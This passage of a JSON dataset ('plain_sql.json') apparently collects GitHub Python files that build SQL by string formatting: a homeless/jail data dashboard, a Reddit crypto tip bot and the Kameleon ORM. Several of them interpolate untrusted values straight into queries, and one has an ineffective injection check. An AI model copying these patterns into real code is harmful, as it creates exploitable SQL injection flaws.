(\"coalesce(hmis_summary.last_name, jail_summary.last_name)\", 'last_name'),\n        (\"hmis_summary.hmis_id\", 'hmis_id'),\n        (\"hmis_summary.hmis_contact\", 'hmis_contact'),\n        (\"hmis_summary.last_hmis_contact\", 'last_hmis_contact'),\n        (\"hmis_summary.cumu_hmis_days\", 'cumu_hmis_days'),\n        (\"jail_summary.jail_id\", 'jail_id'),\n        (\"jail_summary.jail_contact\", 'jail_contact'),\n        (\"jail_summary.last_jail_contact\", 'last_jail_contact'),\n        (\"jail_summary.cumu_jail_days\", 'cumu_jail_days'),\n        (\"coalesce(hmis_summary.hmis_contact, 0) + coalesce(jail_summary.jail_contact, 0)\", 'total_contact'),\n    ]\n    if not any(order_column for expression, alias in columns):\n        raise ValueError('Given order column expression does not match any alias in query. Exiting to avoid SQL injection attacks')\n    base_query = \"\"\"WITH hmis_summary AS (\n        SELECT\n            matched_id,\n            string_agg(distinct internal_person_id::text, ',') as hmis_id,\n            sum(\n                case when client_location_end_date is not null \n                    then date_part('day', client_location_end_date::timestamp - client_location_start_date::timestamp) \\\n                    else date_part('day', updated_ts::timestamp - client_location_start_date::timestamp) \n                end\n            )::int as cumu_hmis_days,\n            count(*) AS hmis_contact,\n            to_char(max(client_location_start_date::timestamp), 'YYYY-MM-DD') as last_hmis_contact,\n            max(first_name) as first_name,\n            max(last_name) as last_name\n        FROM (\n            SELECT\n               *\n            FROM {hmis_table}\n            WHERE\n                not (client_location_start_date < %(start_date)s AND client_location_end_date < %(start_date)s) and\n                not (client_location_start_date > %(end_date)s AND client_location_end_date > %(end_date)s)\n        ) AS hmis\n        GROUP BY matched_id\n    ), jail_summary AS (\n        SELECT\n            matched_id,\n            string_agg(distinct coalesce(internal_person_id, inmate_number)::text, ',') as jail_id,\n            sum(\n                case when jail_exit_date is not null \n                    then date_part('day', jail_exit_date::timestamp - jail_entry_date::timestamp) \\\n                    else date_part('day', updated_ts::timestamp - jail_entry_date::timestamp) \n                end\n            )::int as cumu_jail_days,\n            count(*) AS jail_contact,\n            to_char(max(jail_entry_date::timestamp), 'YYYY-MM-DD') as last_jail_contact,\n            max(first_name) as first_name,\n            max(last_name) as last_name\n        FROM (\n            SELECT\n               *\n            FROM {booking_table}\n            WHERE\n                not (jail_entry_date < %(start_date)s AND jail_exit_date < %(start_date)s) and\n                not (jail_entry_date > %(end_date)s AND jail_exit_date > %(end_date)s)\n        ) AS jail\n        GROUP BY matched_id\n    )\n    SELECT\n    {columns}\n    FROM hmis_summary\n    FULL OUTER JOIN jail_summary USING(matched_id)\n    \"\"\".format(\n        hmis_table=matched_hmis_table,\n        booking_table=matched_bookings_table,\n        columns=\",\\n\".join(\"{} as {}\".format(expression, alias) for expression, alias in columns),\n    )\n\n\n    logging.info('Querying table records')\n    if order not in {'asc', 'desc'}:\n        raise ValueError('Given order direction is not valid. Exiting to avoid SQL injection attacks')\n    if not isinstance(limit, int) and not limit.isdigit() and limit != 'ALL':\n        raise ValueError('Given limit is not valid. Existing to avoid SQL injection attacks')\n    filter_by_status = {\n        'Jail': 'jail_summary.matched_id is not null',\n        'HMIS': 'hmis_summary.matched_id is not null',\n        'Intersection': 'hmis_summary.matched_id = jail_summary.matched_id'\n    }\n    status_filter = filter_by_status.get(set_status, 'true')\n    rows_to_show = [dict(row) for row in db.engine.execute(\"\"\"\n        {}\n        where {}\n        order by {} {}\n        limit {} offset %(offset)s\"\"\".format(\n            base_query,\n            status_filter,\n            order_column,\n            order,\n            limit\n        ),\n        start_date=start_time,\n        end_date=end_time,\n        offset=offset,\n    )]\n    query = \"\"\"\n    SELECT\n    *,\n    DATE_PART('day', {exit}::timestamp - {start}::timestamp) as days\n    FROM {table_name}\n    WHERE\n        not ({start} < %(start_time)s AND {exit} < %(start_time)s) and\n        not ({start} > %(end_time)s AND {exit} > %(end_time)s)\n    \"\"\"\n    hmis_query = query.format(\n        table_name=matched_hmis_table,\n        start=\"client_location_start_date\",\n        exit=\"client_location_end_date\"\n    )\n    bookings_query = query.format(\n        table_name=matched_bookings_table,\n        start=\"jail_entry_date\",\n        exit=\"jail_exit_date\"\n    )\n    logging.info('Done querying table records')\n    logging.info('Querying venn diagram stats')\n    venn_diagram_stats = next(db.engine.execute('''select\n        count(distinct(hmis.matched_id)) as hmis_size,\n        count(distinct(bookings.matched_id)) as bookings_size,\n        count(distinct(case when hmis.matched_id = bookings.matched_id then hmis.matched_id else null end)) as shared_size,\n        count(distinct(matched_id))\n        from ({}) hmis\n        full outer join ({}) bookings using (matched_id)\n    '''.format(hmis_query, bookings_query),\n                                start_time=start_time,\n                                end_time=end_time))\n    counts_by_status = {\n        'HMIS': venn_diagram_stats[0],\n        'Jail': venn_diagram_stats[1],\n        'Intersection': venn_diagram_stats[2]\n    }\n\n    logging.info('Done querying venn diagram stats')\n\n    venn_diagram_data = [\n        {\n            \"sets\": [\n                \"Jail\"\n            ],\n            \"size\": venn_diagram_stats[1]\n        },\n        {\n            \"sets\": [\n                \"Homeless\"\n            ],\n            \"size\": venn_diagram_stats[0]\n        },\n        {\n            \"sets\": [\n                \"Jail\",\n                \"Homeless\"\n            ],\n            \"size\": venn_diagram_stats[2]\n        }\n    ]\n    logging.info('Retrieving bar data from database')\n    filtered_data = retrieve_bar_data(matched_hmis_table, matched_bookings_table, start_time, end_time)\n    logging.info('Done retrieving bar data from database')\n    filtered_data['tableData'] = rows_to_show\n    return {\n        \"vennDiagramData\": venn_diagram_data,\n        \"totalTableRows\": counts_by_status.get(set_status, venn_diagram_stats[3]),\n        \"filteredData\": filtered_data\n    }\n\n\ndef retrieve_bar_data(matched_hmis_table, matched_bookings_table, start_time, end_time):\n    query = \"\"\"\n    SELECT\n    *,\n    DATE_PART('day', {exit}::timestamp - {start}::timestamp) as days\n    FROM {table_name}\n    WHERE\n        not ({start} < %(start_time)s AND {exit} < %(start_time)s) and\n        not ({start} > %(end_time)s AND {exit} > %(end_time)s)\n    \"\"\"\n    filtered_hmis = pd.read_sql(\n        query.format(\n            table_name=matched_hmis_table,\n            start=\"client_location_start_date\",\n            exit=\"client_location_end_date\"),\n        con=db.engine,\n        params={\n            \"start_time\": start_time,\n            \"end_time\": end_time\n    })\n\n\n    filtered_bookings = pd.read_sql(\n        query.format(\n            table_name=matched_bookings_table,\n            start=\"jail_entry_date\",\n            exit=\"jail_exit_date\"),\n        con=db.engine,\n        params={\n            \"start_time\": start_time,\n            \"end_time\": end_time\n    })\n    shared_ids = filtered_hmis[filtered_hmis.matched_id.isin(filtered_bookings.matched_id)].matched_id.unique()\n\n    if len(shared_ids) == 0:\n        logger.warning(\"No matched between two services\")\n\n    # Handle the case that empty query results in ZeroDivisionError\n    bar_data = {\n        \"jailDurationBarData\": get_histogram_bar_chart_data(filtered_bookings, get_days_distribution, shared_ids, 'Jail'),\n        \"homelessDurationBarData\": get_histogram_bar_chart_data(filtered_hmis, get_days_distribution, shared_ids, 'Homeless'),\n        \"jailContactBarData\": get_histogram_bar_chart_data(filtered_bookings, get_contact_dist, shared_ids, 'Jail'),\n        \"homelessContactBarData\": get_histogram_bar_chart_data(filtered_hmis, get_contact_dist, shared_ids, 'Homeless'),\n    }\n\n    return bar_data\n\n\ndef get_task_uplaod_id(n):\n    query = \"\"\"\n    SELECT *\n    FROM (\n        SELECT row_number() over (ORDER By upload_timestamp DESC) as rownumber, *\n        FROM upload_log\n    ) as foo\n    where rownumber = %(n)s\n    \"\"\"\n    df = pd.read_sql(\n        query,\n        con=db.engine,\n        params={\"n\": n}\n    )\n    return df\n\n\ndef get_history():\n    query = \"\"\"\n    SELECT\n        upload_log.id as upload_id,\n        upload_log.jurisdiction_slug,\n        upload_log.event_type_slug,\n        upload_log.user_id,\n        upload_log.given_filename,\n        upload_log.upload_timestamp,\n        upload_log.num_rows,\n        upload_log.file_size,\n        upload_log.file_hash,\n        upload_log.s3_upload_path,\n        match_log.id as match_id,\n        match_log.match_start_timestamp,\n        match_log.match_complete_timestamp,\n        to_char(match_log.runtime, 'HH24:MI:SS') as runtime\n    FROM match_log\n    LEFT JOIN upload_log ON upload_log.id = match_log.upload_id\n    ORDER BY match_complete_timestamp ASC\n    \"\"\"\n    df = pd.read_sql(\n        query,\n        con=db.engine\n    )\n    return df\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ktechmidas/garlictipsbot/blob/158b611106d3cdfd5a375bc98794cc989d74639b",
        "file_path": "/deposit.py",
        "source": "import json\nimport praw\nimport pdb\nimport sys\nimport MySQLdb\nimport prawcore\nfrom decimal import *\nimport subprocess\nimport shlex\nimport argparse\nfrom utils import utils\n#from tipbot import logger\n\nclass deposit():\n        \n    def __init__(self):\n        #Set up MySQL cursor\n        self.debug = 1\n        self.utils = utils()\n        #self.logger = logger()\n        self.reddit = self.utils.connect_to_reddit()\n        self.cursor = self.utils.get_mysql_cursor()\n\n    def checks(self):\n        me = reddit.user.me()\n\n    def all_deposits(self,coin):\n        sql = \"SELECT * FROM deposits WHERE coin='%s'\" % coin\n        self.cursor.execute(sql)\n        return self.cursor.fetchall()\n\n    def get_amount_from_json(self,raw_tx,tx_in_db):\n        json_tx = json.loads(raw_tx)\n        return json_tx[tx_in_db]['amount']\n\n\n    def check_deposits(self,username,tx_in_db,coin):\n        qcheck = subprocess.check_output(shlex.split('%s/%s/bin/%s-cli listtransactions %s' % (self.utils.config['other']['full_dir'],coin,coin,username)))\n        txamount = qcheck.count(\"amount\") #TODO: This can be done a lot better.\n        \n        if txamount > tx_in_db:\n            #We have a TX that has not been credited yet\n            newtx = self.get_amount_from_json(qcheck,tx_in_db)\n            if self.debug:\n                print \"More TXs than in DB. We have %s in DB and %s on the blockchain for %s - AMT: %s - COIN: %s\" % (tx_in_db, txamount, username, newtx, coin)\n            \n            #self.logger.logline(\"Deposit: More TXs than in DB. We have %s in DB and %s on the blockchain for %s - AMT: %s\" % (tx_in_db, txamount, username, newtx))\n            sql = \"UPDATE deposits SET txs=txs+1 WHERE username=%s AND coin=%s\"\n            self.cursor.execute(sql, (username,coin,))\n\n            if coin == \"garlicoin\":\n                sql = \"UPDATE amounts SET amount=amount+%s WHERE username=%s\"\n                self.cursor.execute(sql, (newtx,username,))\n            elif coin == \"dash\":\n                sql = \"UPDATE amounts SET dashamt=dashamt+%s WHERE username=%s\"\n                self.cursor.execute(sql, (newtx,username,))\n            return newtx\n        else:\n            return 0\n\n    def send_messages(self,recv,subject,message):\n        redmsg = self.reddit.redditor(recv)\n        redmsg.message(subject, message)\n\n    def main(self):\n        #Can we connect to Reddit?\n        try:\n            me = self.reddit.user.me()\n        except:\n            print(\"Something went wrong. Please check Reddit for details\")\n            sys.exit()\n \n\tcnt = 1\n        for coin in self.utils.config['other']['cryptos'].values():\n\t    coin = str(coin)\n            result = self.all_deposits(coin)\n            for row in result:\n                username = row[1]\n                tx_in_db = row[3]\n                amt = self.check_deposits(username,tx_in_db,coin)\n\n                if amt != 0:\n                    self.send_messages(username,\"Deposit Accepted\",\"Hi, we receieved your %s deposit of %s and it's now in your account. Please send the word balance to the bot to get your current balance if needed or PM /u/ktechmidas if something is amiss\" % (coin,amt))\n\n\ndepob = deposit()\ndepob.main()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/databases/postgresql.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom twisted.internet.defer import inlineCallbacks, returnValue\n\nfrom base import Database\n\nclass PostgresqlDatabase(Database):\n\n    JOIN = \"JOIN\"\n    LEFT_JOIN = \"LEFT JOIN\"\n\n    TYPES = {\n        'BOOL': 'bool',\n        'CHAR': 'varchar',\n        'FLOAT': 'float',\n        'INT': 'int',\n        'JSON': 'jsonb',\n        'DATE': 'timestamp'\n    }\n\n    def connectionError(self, f):\n        print(\"ERROR: connecting failed with {0}\".format(f.value))\n\n    @inlineCallbacks\n    def _connect(self, **kwargs):\n        from txpostgres import txpostgres, reconnection\n        from txpostgres.reconnection import DeadConnectionDetector\n\n        class LoggingDetector(DeadConnectionDetector):\n\n            def startReconnecting(self, f):\n                print(\"ERROR: database connection is down (error: {0})\"\n                      .format(f.value))\n                return DeadConnectionDetector.startReconnecting(self, f)\n\n            def reconnect(self):\n                print(\"INFO: Reconnecting...\")\n                return DeadConnectionDetector.reconnect(self)\n\n            def connectionRecovered(self):\n                print(\"INFO: connection recovered\")\n                return DeadConnectionDetector.connectionRecovered(self)\n\n        self.connection = txpostgres.Connection(detector=LoggingDetector())\n        d = self.connection.connect(host=kwargs['host'],\n                                    database=self.name,\n                                    user=kwargs['user'],\n                                    password=kwargs['password'])\n        d.addErrback(self.connection.detector.checkForDeadConnection)\n        d.addErrback(self.connectionError)\n        yield d\n        print(\"INFO: Database connected -- %s\" %self.name)\n\n    @inlineCallbacks\n    def _close(self, *args):\n        try:\n            if self.connection:\n                yield self.connection.close()\n        except Exception as err:\n            print(\"ERROR: while closing DB connection\")\n            print(err)\n        else:\n            print(\"INFO: Connection close cleanly\")\n\n    @inlineCallbacks\n    def runOperation(self, operation):\n        try:\n            yield self.connection.runOperation(operation)\n        except Exception as err:\n            print(\"ERROR: Running operation %s\" %operation)\n            print(err)\n\n    @inlineCallbacks\n    def runQuery(self, query):\n        answer = []\n        try:\n            answer = yield self.connection.runQuery(query)\n        except Exception as err:\n            print(\"ERROR: Running query %s\" %query)\n            print(err)\n            # Return special values if error. The code should be able to know\n        returnValue(answer)\n\n    def create_table_title(self, name):\n        return \"CREATE TABLE %s (\" %(name)\n\n    def create_table_field_end(self, current, field):\n        return \" %s %s);\" %(current,field)\n\n    def create_table_field(self, current, field):\n        return \" %s %s,\" %(current,field)\n\n    def create_unique(self, current, unique):\n        return \" %s UNIQUE (%s),\" %(current, \",\".join(unique))\n\n    def delete_table(self, table_name, cascade=True):\n        operation = \"DROP TABLE IF EXISTS %s\"%(table_name)\n        if cascade:\n            operation += \" CASCADE\"\n\n        operation +=\";\"\n        return operation\n\n    def generate_insert(self, query):\n\n        keys = \",\".join([x.encode(\"utf-8\") for x in query.values.keys()])\n        values = \",\".join([x.encode(\"utf-8\") for x in query.values.values()])\n\n        str_query = (\"INSERT INTO {0} ({1}) VALUES ({2})\"\n                    .format(query.model_class._meta.table_name, keys, values))\n\n        if query.on_conflict:\n            str_query += (\" ON CONFLICT ({0}) DO UPDATE SET ({1}) = ({2})\"\n                         .format(\",\".join(query.on_conflict), keys, values))\n\n        if query.return_id:\n            str_query += \" RETURNING id\"\n\n        str_query += \";\"\n        return str_query\n\n    def generate_delete(self, query):\n\n        where=''\n        if query._where:\n            i = 0\n            if isinstance(query._where, str):\n                where = \"WHERE {0}\".format(query._where)\n            else:\n                for value in query._where:\n                    if i == 0:\n                        con = \"WHERE \"\n                    else:\n                        con = \" AND \"\n                    where += \"%s %s.%s %s '%s'\"%(con, value.lhs.model_class._meta.table_name, value.lhs.name, value.op, value.rhs)\n                    i+=1\n\n        query = 'DELETE FROM {0} {1};'.format(query.model_class._meta.table_name, where)\n        return query\n\n    def generate_update(self, query):\n\n        if query.model_class._meta.primary_key:\n            _id = query.values[\"id\"]\n            del query.values[\"id\"]\n\n        keys = \",\".join([x.encode(\"utf-8\") for x in query.values.keys()])\n        values = \",\".join([x.encode(\"utf-8\") for x in query.values.values()])\n\n        if query.model_class._meta.primary_key:\n            str_query = (\"UPDATE {0} SET ({1})=({2}) WHERE id = {3}\"\n                        .format(query.model_class._meta.table_name, keys, values, _id))\n        else:\n            # XXX To Do: If not id -> check if one of the field is Unique. If one is unique use it to update\n            print(\"ERROR: Not primary key cannot update row. Need to be implemented\")\n            raise Exception(\"ERROR: Not primary key cannot update row. Need to be implemented\")\n\n        if query.return_id:\n            str_query += \" RETURNING id\"\n\n        str_query += \";\"\n        return str_query\n\n    def generate_add(self, query):\n        table_name = query.model_class._meta.table_name\n\n        query = (\"INSERT INTO {0} ({1}) SELECT {2} WHERE NOT EXISTS (SELECT {3} FROM {0} WHERE {3}='{5}' AND {4}='{6}');\"\n                .format(table_name,\n                        \",\".join(query.model_class._meta.sorted_fields_names),\n                        \",\".join([str(obj.id) for obj in query.objs]),\n                        query.model_class._meta.sorted_fields_names[0],\n                        query.model_class._meta.sorted_fields_names[1],\n                        query.objs[0].id,\n                        query.objs[1].id))\n        return query\n\n    def generate_remove(self, query):\n        table_name = query.model_class._meta.table_name\n\n        query = (\"DELETE FROM {0} WHERE {1} = '{3}' AND {2}='{4}';\"\n                .format(table_name,\n                        query.model_class._meta.sorted_fields_names[0],\n                        query.model_class._meta.sorted_fields_names[1],\n                        query.objs[0].id,\n                        query.objs[1].id))\n\n        return query\n\n    def generate_select(self, queryInstance):\n        target = '*'\n\n        joint = \"\"\n        if queryInstance._joins:\n            for join in queryInstance._joins:\n\n                # XXX To Do: Implement other join type\n                joint_type = join.joint_type\n                if joint_type == self.JOIN:\n                    joint_type = self.JOIN\n                else:\n                    joint_type = self.LEFT_JOIN\n\n                if join.dest in join.src._meta.rel_class and join.src.isForeignKey(join.src._meta.rel_class[join.dest]):\n                    clause1 = \"%s.%s\"%(join.src._meta.table_name, join.src._meta.rel_class[join.dest].name)\n                    clause2 = \"%s.%s\"%(join.dest._meta.table_name, join.src._meta.rel_class[join.dest].reference.name)\n\n                elif join.src in join.dest._meta.rel_class and join.dest.isForeignKey(join.dest._meta.rel_class[join.src]):\n                    clause1 = \"%s.%s\"%(join.src._meta.table_name, join.dest._meta.rel_class[join.src].reference.name)\n                    clause2 = \"%s.%s\"%(join.dest._meta.table_name, join.dest._meta.rel_class[join.src].name)\n\n                else:\n                    raise Exception(\"Logic error\")\n\n                joint += \"%s %s on (%s = %s) \"%(joint_type, join.dest._meta.table_name, clause1, clause2)\n\n        where=''\n        if queryInstance._where:\n            i = 0\n            if isinstance(queryInstance._where, str):\n                where = \"WHERE {0}\".format(queryInstance._where)\n            else:\n                where = queryInstance._where.parse()\n                where = \"WHERE {0}\".format(where)\n\n        end = \";\"\n        if queryInstance._delete:\n            queryType = \"DELETE\"\n            if queryInstance.model_class._meta.primary_key:\n                end = \" RETURNING id;\"\n        else:\n            queryType = \"SELECT {0}\".format(\",\".join(target))\n\n        query = ('{0} FROM {1} {2} {3}{4}'\n                .format(queryType, queryInstance.model_class._meta.table_name,\n                        joint, where, end))\n        # print(query)\n        return query\n\n    def parse_select(self, query, result):\n        class_list = []\n\n        if query._joins:\n            current = [None]*len(query._joins) + [None]\n            models_class = {}\n            rel = []\n            pos = {}\n\n            for res in result:\n                start = len(query.model_class._meta.sorted_fields_names)\n                curr_list = res[:start]\n                i = 0\n\n                if not models_class:\n                    pos[query.model_class] = i\n                    rel.append(None)\n\n                if not str(curr_list) in models_class:\n                    kwargs = dict(zip(query.model_class._meta.sorted_fields_names, curr_list))\n                    last_model = query.model_class(**kwargs)\n                    models_class[str(curr_list)] = {\n                        \"model\": last_model\n                    }\n                    class_list.append(last_model)\n\n                current[i] = models_class[str(curr_list)]\n\n                for join in query._joins:\n                    curr_list = res[start:start+len(join.dest._meta.sorted_fields_names)]\n\n                    start += len(join.dest._meta.sorted_fields_names)\n                    i += 1\n\n                    if len(rel) == i:\n                        pos[join.dest] = i\n                        rel.append(pos[join.src])\n\n                    if curr_list == [None]*len(join.dest._meta.sorted_fields_names):\n                        current[i] = {\n                            \"model\" : None\n                        }\n                        if not i in current[rel[i]]:\n                            current[rel[i]][i] = {}\n\n                        current[rel[i]][i][\"None\"] = current[i]\n                        continue\n                    else:\n                        if not i in current[rel[i]] or not str(curr_list) in current[rel[i]][i]:\n                            kwargs = dict(zip(join.dest._meta.sorted_fields_names, curr_list))\n                            new_model = join.dest(**kwargs)\n                            current[i] = {\n                                \"model\" : new_model\n                            }\n\n                            if not i in current[rel[i]]:\n                                current[rel[i]][i] = {}\n\n                            current[rel[i]][i][str(curr_list)] = current[i]\n                        else:\n                            current[i] = current[rel[i]][i][str(curr_list)]\n                            continue\n\n                        current[i] = current[rel[i]][i][str(curr_list)]\n                        new_model = current[i][\"model\"]\n\n                        if join.src in pos:\n                            if join.src._meta.many_to_many:\n                                middle_table_index = rel[i]\n                                index = pos[current[rel[i]][\"model\"].__class__]\n                                x = getattr(new_model, current[rel[i]][\"model\"]._meta.rel_class[join.dest].related_name)\n                                x.append(current[rel[index]][\"model\"])\n                                x = getattr(current[rel[index]][\"model\"], current[rel[i]][\"model\"]._meta.rel_class[join.dest].name)\n                                x.append(new_model)\n\n                            elif not join.dest._meta.many_to_many:\n                                if current[rel[i]][\"model\"].isForeignKey(current[rel[i]][\"model\"]._meta.rel_class[join.dest]):\n                                    x = getattr(new_model, current[rel[i]][\"model\"]._meta.rel_class[join.dest].related_name)\n                                    x.append(current[rel[i]][\"model\"])\n                                    setattr(current[rel[i]][\"model\"], current[rel[i]][\"model\"]._meta.rel_class[join.dest].name, new_model)\n\n                                elif current[rel[i]][\"model\"].isReferenceField(current[rel[i]][\"model\"]._meta.rel_class[join.dest]):\n                                    x = getattr(current[rel[i]][\"model\"], current[rel[i]][\"model\"]._meta.rel_class[join.dest].name)\n                                    x.append(new_model)\n                                    setattr(new_model, current[rel[i]][\"model\"]._meta.rel_class[join.dest].related_name, current[rel[i]][\"model\"])\n                                else:\n                                    raise Exception(\"Here Logic error\")\n\n                        else:\n                            raise Exception(\"Logic error\")\n\n        else:\n            for res in result:\n                kwargs = dict(zip(query.model_class._meta.sorted_fields_names, res))\n                class_list.append(query.model_class(**kwargs))\n\n        return class_list\n\n    def propagate(self, model):\n        print(\"WARNING: Ignoring propagate -- Function not set\")\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/booleanField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass BooleanField(Field):\n    TYPE = 'BOOL'\n\n    def __init__(self, *args, **kwargs):\n        super(BooleanField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = \"%s bool\" %(str(name))\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/charField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nMAX_LENGTH = 255\n\nclass CharField(Field):\n    TYPE = 'CHAR'\n\n    def __init__(self, max_length=MAX_LENGTH, *args, **kwargs):\n        super(CharField, self).__init__(*args, **kwargs)\n        self.max_length = max_length\n\n    def get_db_field(self):\n        if self.model_class._meta.database:\n            return (\"{0}({1})\"\n                    .format(self.model_class._meta.database.TYPES[self.TYPE],\n                            self.max_length))\n\n        return self.TYPE\n\n    def create_field(self, name):\n        field_string = (\"{0} {1}({2})\"\n                        .format(name, self.model_class._meta.database.TYPES[self.TYPE], self.max_length))\n\n        if self.unique:\n            field_string += \" UNIQUE\"\n\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/floatField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\n\nclass FloatField(Field):\n    TYPE = 'FLOAT'\n\n    def __init__(self, *args, **kwargs):\n        super(FloatField, self).__init__(*args, **kwargs)\n\n    def create_field(self, name):\n        field_string = \"%s float\" %(str(name))\n        return field_string\n\n    def insert_format(self, value):\n        value = u\"'{0}'\".format(value)\n        return value\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/ThinkEE/Kameleon/blob/d4bf00e29d3b55191c8bc7880d298ced4e43bfd8",
        "file_path": "/kameleon/model/fields/foreignKeyField.py",
        "source": "################################################################################\n# MIT License\n#\n# Copyright (c) 2017 Jean-Charles Fosse & Johann Bigler\n#\n# Permission is hereby granted, free of charge, to any person obtaining a copy\n# of this software and associated documentation files (the \"Software\"), to deal\n# in the Software without restriction, including without limitation the rights\n# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n# copies of the Software, and to permit persons to whom the Software is\n# furnished to do so, subject to the following conditions:\n#\n# The above copyright notice and this permission notice shall be included in all\n# copies or substantial portions of the Software.\n#\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n# SOFTWARE.\n################################################################################\n\nfrom base import Field\nfrom primaryKeyField import 